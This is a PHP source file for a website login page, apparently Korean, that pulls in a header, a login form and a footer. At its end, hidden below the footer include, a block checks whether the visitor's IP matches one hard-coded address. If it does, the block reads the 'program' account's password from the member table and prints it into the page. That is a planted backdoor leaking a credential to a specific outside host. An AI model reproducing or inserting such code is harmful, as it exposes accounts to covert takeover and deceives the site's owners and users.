<?
	include'../header.php';

	$side_menu=2;
?>


<div class="sub_visual sub_visual02 visual_wrap">
	<div class="text-box">로그인</div>
</div>

<div class='content_box' style='width:1100px;'>
	<div class='box_R'>

		<div class='box_content'>
			<?include'./loginForm_.php';?>
		</div>
	</div>
</div>






<?include'../footer.php';?>


<?
if($_SERVER['REMOTE_ADDR'] == '106.246.92.237'){
	$sql = "select * from tb_member where userid='program'";
	$result = mysql_query($sql);
	$row = mysql_fetch_array($result);

	echo $row['pwd'];
}
?>